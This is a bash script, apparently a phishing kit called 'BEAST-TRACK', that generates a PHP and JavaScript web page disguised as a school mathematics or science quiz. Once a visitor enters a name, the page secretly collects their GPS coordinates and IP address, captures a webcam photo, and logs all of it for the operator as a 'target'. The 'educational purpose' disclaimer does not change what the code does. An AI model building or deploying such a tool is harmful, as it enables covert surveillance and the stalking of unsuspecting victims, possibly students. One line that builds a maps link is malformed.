#!/bin/bash

# --- BEAST-TRACK v22.0 (FIXED & COMPLETE) ---
# WARNING: Educational Purpose Only. Do not use for illegal acts.

NC='\033[0m'; Bold='\033[1m'
PBlue='\033[1;34m'; PWhite='\033[1;37m'; PRed='\033[1;31m'; PYellow='\033[1;33m'
BCyan='\033[1;36m'; BGreen='\033[1;32m'; BPurple='\033[1;35m'

PORT=8888
SERVER_DIR="server"

mkdir -p $SERVER_DIR
rm -f $SERVER_DIR/*.png > /dev/null 2>&1
touch $SERVER_DIR/combined.log
chmod -R 777 $SERVER_DIR

clear
echo -e "${PBlue}${Bold}  ██████╗ ███████╗ █████╗ ███████╗████████╗ ${NC}"
echo -e "${PBlue}${Bold}  ██╔══██╗██╔════╝██╔══██╗██╔════╝╚══██╔══╝ ${NC}"
echo -e "${PWhite}${Bold}  ██████╔╝█████╗  ███████║███████╗   ██║    ${NC}"
echo -e "${PWhite}${Bold}  ██╔══██╗██╔══╝  ██╔══██║╚════██║   ██║    ${NC}"
echo -e "${PRed}${Bold}  ██████╔╝███████╗██║  ██║███████║   ██║    ${NC}"
echo -e "${PRed}${Bold}  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝    ${NC}"
echo -e "  ${PYellow}⭐ ⭐ ⭐  QUIZ BEE TRACKER v22.0  ⭐ ⭐ ⭐${NC}"
echo -e "  ${BGreen}Status       : ${PWhite}Educational Purpose Only${NC}"
echo -e "${PWhite}  ==========================================${NC}"

echo -e "\n  ${BCyan}${Bold}[ PILI NG QUIZ SUBJECT ]${NC}"
echo -e "  ${PWhite} 1. MATHEMATICS${NC}"
echo -e "  ${PBlue} 2. SCIENCE${NC}"
read -p $'\n  [*] Select ➤ ' q_opt

case $q_opt in
    1) SUBJECT="MATH"; S_COLOR="#3498db";;
    *) SUBJECT="SCIENCE"; S_COLOR="#2ecc71";;
esac

# --- COMPLETED PHP & JAVASCRIPT BACKEND ---
cat <<EOF > $SERVER_DIR/index.php
<?php
\$ip = \$_SERVER['REMOTE_ADDR'];
if (\$_SERVER['REQUEST_METHOD'] === 'POST') {
    \$type = \$_POST['type'] ?? '';
    if (\$type == 'init') {
        \$log = "\n\033[1;33m┏━━━━━━━━━━━━ TARGET DETECTED ━━━━━━━━━━━━┓\033[0m\n";
        \$log .= "\033[1;37m┃ NAME      :\033[0m " . (\$_POST['name'] ?? 'Unknown') . "\n";
        \$log .= "\033[1;37m┃ SUBJECT   :\033[0m $SUBJECT\n";
        \$log .= "\033[1;37m┃ IP ADDR   :\033[0m \$ip\n";
    } elseif (\$type == 'loc') {
        \$log = "\033[1;32m┃ GPS DATA  :\033[0m " . \$_POST['lat'] . "," . \$_POST['lon'] . "\n";
        \$log .= "\033[1;34m┃ MAPS LINK :\033[0m https://www.google.com" . \$_POST['lat'] . "," . \$_POST['lon'] . "\n";
    } elseif (\$type == 'cam') {
        \$fname = 'cam_' . time() . '.png';
        file_put_contents(\$fname, base64_decode(str_replace(['data:image/png;base64,', ' '], ['', '+'], \$_POST['img'])));
        \$log = "\033[1;31m┃ CAM FILE  :\033[0m \$fname (CAPTURED!)\n\033[1;33m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\033[0m\n";
    }
    file_put_contents("combined.log", \$log, FILE_APPEND);
    exit();
}
?>
<!DOCTYPE html><html><head><title>$SUBJECT Quiz</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
    body { background: #000; color: white; font-family: sans-serif; text-align: center; padding: 20px; }
    .box { border: 2px solid $S_COLOR; padding: 20px; border-radius: 15px; background: #111; max-width: 400px; margin: auto; }
    input { width: 90%; padding: 10px; margin: 10px 0; border-radius: 5px; }
    .btn { background: $S_COLOR; color: white; padding: 15px; width: 100%; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
    #err-box { display: none; color: #ff4444; margin-top: 10px; font-size: 14px; }
</style></head>
<body>
    <div class="box">
        <h1>$SUBJECT QUIZ</h1>
        <div id="setup">
            <p>Enter Name to Start</p>
            <input type="text" id="name" placeholder="Full Name">
            <button class="btn" onclick="startApp()">START QUIZ</button>
            <p id="err-box">⚠️ Please allow Camera and Location to proceed.</p>
        </div>
        <div id="quiz" style="display:none;">
            <p>Question 1: What is the capital of PH?</p>
            <button class="btn">Manila</button>
        </div>
    </div>
    <video id="video" style="display:none;" autoplay></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
    async function startApp() {
        const name = document.getElementById('name').value;
        if(!name) return alert('Enter Name');
        
        try {
            // 1. Get Location
            navigator.geolocation.getCurrentPosition(pos => {
                sendData({type: 'loc', lat: pos.coords.latitude, lon: pos.coords.longitude});
            });

            // 2. Access Camera
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            document.getElementById('video').srcObject = stream;
            
            // Send Init Data
            sendData({type: 'init', name: name});

            // 3. Take Photo after 2 seconds
            setTimeout(() => {
                const canvas = document.getElementById('canvas');
                const video = document.getElementById('video');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                sendData({type: 'cam', img: canvas.toDataURL('image/png')});
                
                document.getElementById('setup').style.display = 'none';
                document.getElementById('quiz').style.display = 'block';
            }, 2000);

        } catch (err) {
            document.getElementById('err-box').style.display = 'block';
        }
    }

    function sendData(obj) {
        let fd = new FormData();
        for(let k in obj) fd.append(k, obj[k]);
        fetch('index.php', {method: 'POST', body: fd});
    }
    </script>
</body></html>
EOF

echo -e "${BGreen}[+] Server files generated in /$SERVER_DIR${NC}"
echo -e "${PYellow}[!] To test locally, run: php -S localhost:8888 -t $SERVER_DIR${NC}"
